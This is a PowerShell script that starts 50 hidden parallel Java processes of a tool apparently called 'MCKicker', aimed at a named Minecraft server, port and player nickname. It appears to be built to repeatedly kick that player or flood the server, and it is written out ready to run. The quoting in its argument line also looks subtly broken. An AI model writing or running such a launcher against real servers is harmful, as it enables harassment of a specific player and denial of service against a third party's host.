$java = "C:\Program Files\Eclipse Adoptium\jdk-17.0.19.10-hotspot\bin\java.exe"
$cp = "C:\Users\maska\OneDrive\Desktop\PWP\SQUAD mc"
$hostname = "SquadMC.exaroton.me"
$port = 37863
$nick = "danilfb1234"
Write-Host "Starting 50 parallel kickers..."
$processes = @()
for ($i = 1; $i -le 50; $i++) {
    $proc = Start-Process -FilePath $java -ArgumentList "-cp "$cp" MCKicker $hostname $port $nick" -WindowStyle Hidden -PassThru
    $processes += $proc
}
Write-Host "All 50 running. Press any key to stop."
$host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
$processes | ForEach-Object { try { $_.Kill() } catch {} }
Write-Host "Stopped"
